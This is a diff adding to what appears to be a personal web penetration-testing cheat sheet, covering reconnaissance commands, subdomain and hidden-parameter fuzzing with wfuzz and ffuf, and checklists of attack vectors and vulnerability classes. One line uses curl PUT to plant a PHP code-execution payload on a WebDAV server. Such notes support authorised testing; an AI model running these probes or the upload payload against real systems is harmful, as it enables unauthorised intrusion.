@@ -1,11 +1,75 @@
+###################
+# WEB CHEAT SHEET #
+###################
+
 # Note: filter/hide parameters (e.g. filter, fw, fl, hw, hl) need to be adjusted for each case
 
+# Headers
+curl -v -I <URL> [-k]
+
+# Ask for some file that use a technology
+curl -v -i <URL>/file.php [-k]
+
+# Whatweb
+whatweb -v <URL>
+
+# Wappalyzer firefox extension
+
+# Identify accepted methods
+curl -v -X OPTIONS <URL> [-k]
+
+# Identiy web app firewalls
+wafw00f <URL>
+
+# Example of using PUT method to send PHP code
+# (some Webdav services allow PUT)
+curl -v -X PUT -d "<?php system('id');?> http://172.16.1.10/webdav/test.php"
+
+# Common files
+robots.txt, sitemap.xml
+
+# Analyze source code
+html-tool
+
+# Download JS scripts
+getJS
+
+# Directory/file bruteforcing
+# Use my dir_search.sh inside /scripts/
+
 # Subdomain brute force
-WFUZZ: wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.example.com" -u "http://example.com" -t 100  --filter "lines != 0 or words != 65 or chars != 0"
+WFUZZ: wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.example.com" -u "http://example.com" --filter "lines != 0 or words != 65 or chars != 0" -t 100
 FFUF: ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.example.com" -u http://example.com -fw 125 -t 100
 
 # Hidden URL parameters brute force
-wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://example.com/test?FUZZ=value" --filter "lines != 74 or words != 165 or chars != 3628"
+GET: wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://example.com/test?FUZZ=value" --filter "lines != 74 or words != 165 or chars != 3628" -t 100
+POST: wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://example.com/test" -d "FUZZ=value" --filter "lines != 74 or words != 165 or chars != 3628" -t 100
 
 # Searching URL parameters in source code
 curl -s -L 'http://example.com/' | grep -oE "[^\s\'\"]*[\?\&][A-Za-z0-9\.\_\~\-]+=[^\s\'\"]*" | sort | uniq
+
+# Attack vectors
+# (places where we can insert/manipulate data)
+- Search fields
+- Login/Auth fields
+- Register fields
+- Redirects
+- GET/POST parameters
+- Download
+- Upload
+- Posts
+
+# Some vulnerabilities to look for
+- Auth bypass via methods
+- Open redirect (more related to social engineeting)
+- Auth bypass SQLi
+- Full Path Disclosure (FPD)
+- Local File Inclusion (LFI)
+- Remote File Inclusion (RFI)
+- Local File Disclosure (LFD)
+- HTML Injection (more related to social engineeting)
+- XSS and stored XSS (XSStrike tool)
+- SQLi (blind, time based, etc.)
+- Command injection (commix tool)
+- Upload bypass (extensions, .htaccess, content type, images)
+- PHP Wrappers
